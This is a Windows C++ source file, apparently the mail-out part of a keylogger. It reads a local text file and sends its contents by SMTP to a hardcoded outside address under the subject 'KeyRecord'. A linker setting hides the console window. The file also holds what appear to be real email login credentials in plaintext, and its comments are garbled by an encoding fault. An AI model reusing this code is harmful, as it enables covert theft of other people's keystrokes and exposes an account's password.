
#include "stdafx.h"
#include <iostream>
#include <WinSock2.h>
#include <windows.h>
#include <string.h>
using namespace std;
#pragma comment(lib, "ws2_32.lib")	/*����ws2_32.lib��̬���ӿ�*/
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
const int MAXSIZE = 1024;
 
int srvPort = 25;
char srvDomain[256] = "smtp.163.com";
char userName[256] = "leakey2006@163.com"; //�Լ�����������
char password[256] = "L123012"; //�Լ����������
char targetEmail[256] = "leakey2016@126.com"; //Ҫ���͵��ʼ���ַ
char emailTitle[256] = "KeyRecord"; //�ʼ�����
char content[256] = " ";//�ʼ�����
 
SOCKET CreateConn(char* pWebsite,int port)
{
	//Ϊ����socket������׼������ʼ������
	SOCKET sockClient = socket(AF_INET,SOCK_STREAM,0);     //����socket����
	SOCKADDR_IN addrSrv;   
	HOSTENT* pHostent;
    pHostent = gethostbyname(pWebsite);  //�õ��й�����������Ϣ
    
	addrSrv.sin_addr.S_un.S_addr = *((DWORD *)pHostent->h_addr_list[0]);	//�õ�smtp�������������ֽ����ip��ַ   
	addrSrv.sin_family=AF_INET;   
	addrSrv.sin_port=htons(port);   
	int tf = connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));   //���������������  
	if(tf!=0)
	{
		return 0;
		//printf("����ʧ��\n");
	}
	return sockClient;
}
 
//int DoWhat�Ƿ��������
void SendAndRecvMsg(
					SOCKET sockClient,		//�ͻ��˵��׽���
					char* pMessage,			//Ҫ���͵���Ϣ
					int Messagelen,			//��Ϣ�ĳ���
					int DoWhat,				//����������
					char* recvBuf,			//���յĻ�����
					int recvBufLen			//����������
					)
{
	char lpMessage[256] = {0};
	memcpy(lpMessage, pMessage, Messagelen);
	printf("\n\n%s \n", lpMessage);
	if (DoWhat == 0)
	{
		send(sockClient, lpMessage, Messagelen, 0);
		memset(recvBuf , 0, recvBufLen);
		DWORD num = recv(sockClient, recvBuf, recvBufLen, 0);     //��������
		printf("%s \n", recvBuf); 
		int i = 0;
		while(i != num)
		{
			printf("%02X ", recvBuf[i++]); 
			if((i)%16 == 0)
			{
				printf("\n"); 
			}
		}
		printf("\n");
		
	}
	else if (DoWhat == 1)
	{
		send(sockClient, lpMessage, Messagelen, 0);
		
	}
	else if (DoWhat == 2) //�����ǽ�������
	{
		memset(recvBuf, 0, recvBufLen);
		DWORD num=recv(sockClient,recvBuf,recvBufLen,0);     //��������
		cout << recvBuf << endl;
		int i = 0;
		while(i < num)
		{
			printf("%02X ", (BYTE)recvBuf[i++]); 
			if((i)%16 == 0)
			{
				printf("\n"); 
			}
		}
		printf("\n");
	}
	
}
 
int GetStrLen(char* pString) //�õ��ַ����ĳ���
{
	int i = 0;
	while(pString[i++] != 0);
	return i-1;
}
 
 
void StringToBase64(const char *src,char *dst)
{/*���ַ�����Ϊbase64����*/
    int i = 0;
    char *p = dst;
    int d= strlen(src) - 3;
	static const char Base64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    //for(i=0;i<strlen(src)-3;i+=3) ;if (strlen(src)-3)<0 there is a buf
	
    for(i=0;i<=d;i+=3)
    {
        *p++ = Base64[((*(src + i)) >> 2) & 0x3f];
        *p++ = Base64[(((*(src + i)) & 0x3) << 4) + ((*(src + i + 1)) >> 4)];
        *p++ = Base64[((*(src + i + 1) & 0xf) << 2) + ((*(src + i + 2)) >> 6)];
        *p++ = Base64[(*(src + i + 2)) & 0x3f];
    }
    if((strlen(src) - i) == 1)
    {
        *p++ = Base64[((*(src + i)) >> 2) & 0x3f];
        *p++ = Base64[((*(src + i)) & 0x3) << 4];
        *p++ = '=';
        *p++ = '=';
    }
    if((strlen(src) - i) == 2)
    {
        *p++ = Base64[((*(src + i)) >> 2) & 0x3f];
        *p++ = Base64[(((*(src + i)) & 0x3) << 4) + ((*(src + i + 1)) >> 4)];
        *p++ = Base64[((*(src + i + 1) & 0xf) << 2)];
        *p++ = '=';
    }
    *p = '\0';
}
 
 
bool FormatEmail(char* pFrom, char* pTo, char* pSubject, char* pMessage, char* Email)
{/*��ʽ��Ҫ���͵�����*/
	lstrcat(Email, "From: ");
	lstrcat(Email, pFrom);
	lstrcat(Email, "\r\n");
	
	lstrcat(Email, "To: ");
	lstrcat(Email, pTo);
	lstrcat(Email, "\r\n");
	
	lstrcat(Email, "Subject: ");
	lstrcat(Email, pSubject);
	lstrcat(Email, "\r\n");
	
	lstrcat(Email, "MIME-Version: 1.0");
	lstrcat(Email, "\r\n");
	lstrcat(Email, "\r\n");
	
	lstrcat(Email, pMessage);
	
	lstrcat(Email, "\r\n.\r\n");
	return TRUE;
}
 
void main()
{

	/*freopen("mode.txt","r",stdin);*/
	/*int n=0;*/
	/*cin>>n;*/
	/*if(n==0){
		HWND hwnd=GetForegroundWindow();
		ShowWindow(hwnd,SW_HIDE);
	}*/

	freopen("text.txt","r",stdin);

	register int i=0;
	register char ch=cin.get();
	while(ch!=EOF){
		content[i++]=ch;
		ch=cin.get();
	}

	content[i+1]='\0';
	
	freopen("ff.txt","w",stdout);
	cout<<content;
	freopen("CON","w",stdout);

	SYSTEMTIME m_time;
	GetLocalTime(&m_time);
	sprintf(emailTitle, "%02d-%02d-%02d %02d:%02d:%02d", m_time.wYear, m_time.wMonth,m_time.wDay, m_time.wHour, m_time.wMinute, m_time.wSecond);

	freopen("CON","r",stdin);

	/*cout<<content<<endl;

	system("pause");
	return;*/

	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	
	wVersionRequested = MAKEWORD(2, 1);
	err = WSAStartup(wVersionRequested, &wsaData);
	SOCKET sockClient = CreateConn(srvDomain, srvPort); //����smtp���䣬25�Ŷ˿�
 
	char buff[MAXSIZE];
    memset(buff, 0, sizeof(char) * MAXSIZE);  //����
 
	SendAndRecvMsg(sockClient, 0, 0, 2, buff, MAXSIZE);  //��������
	
	char UserNameToSendEmail[256] = {0};
	sprintf(UserNameToSendEmail, "EHLO %s", "leakey2006@163.com");
	lstrcat(UserNameToSendEmail, "\r\n\0");
	SendAndRecvMsg(sockClient, UserNameToSendEmail, GetStrLen(UserNameToSendEmail), 0, buff, MAXSIZE); //�Ƚ���Ҳ����
 
    SendAndRecvMsg(sockClient, "AUTH LOGIN\r\n", strlen("AUTH LOGIN\r\n"), 0, buff, MAXSIZE); //�����½
    char pUerName[256] = {0};
	//strstr��������һ���ַ�������һ���ַ����еĵ�һ�γ��֣������ص�һ�γ���λ�õ�ָ��
 
	DWORD p = strstr(userName,"@") - userName; 
	memcpy(pUerName, userName, p); //�õ��û���,���"13203200199@163.com"�õ�"13203200199"
    char base[256];
    StringToBase64(pUerName, base); //�õ��û�����base64����
 
	char str[MAXSIZE];
	memset(str, 0, MAXSIZE);
	sprintf(str, "%s\r\n", base/*"MTMyMDMyMDAxOTk="*/);
	SendAndRecvMsg(sockClient, str, lstrlen(str), 0, buff, MAXSIZE); //�����û����������շ������ķ���
 
	StringToBase64(password, base);
	memset(str, 0, 1024);
	sprintf(str, "%s\r\n", base);
	SendAndRecvMsg(sockClient, str, lstrlen(str),0, buff, MAXSIZE); //�����û����룬�����շ������ķ���
 
	char MailFrom[256] = {0};
	sprintf(MailFrom, "MAIL FROM: <%s>\r\n", userName);
	
	SendAndRecvMsg(sockClient, MailFrom, lstrlen(MailFrom), 0, buff, MAXSIZE);
	
	char RcptTo[256] = {0};
	sprintf(RcptTo, "RCPT TO: <%s>\r\n", targetEmail);
	SendAndRecvMsg(sockClient, RcptTo, lstrlen(RcptTo), 0, buff, MAXSIZE);
 
	SendAndRecvMsg(sockClient, "DATA\r\n", lstrlen("DATA\r\n"), 0, buff, MAXSIZE);
 
	char Email[1024] = {0};
	FormatEmail(userName, targetEmail, emailTitle, content, Email);
	
	SendAndRecvMsg(sockClient,Email,lstrlen(Email), 0, buff, MAXSIZE);
	
	SendAndRecvMsg(sockClient,"QUIT\r\n", lstrlen("QUIT\r\n"), 0, buff, MAXSIZE);
 
    closesocket(sockClient);   
	WSACleanup();

	return;
	/*if(n==1) system("pause");*/
}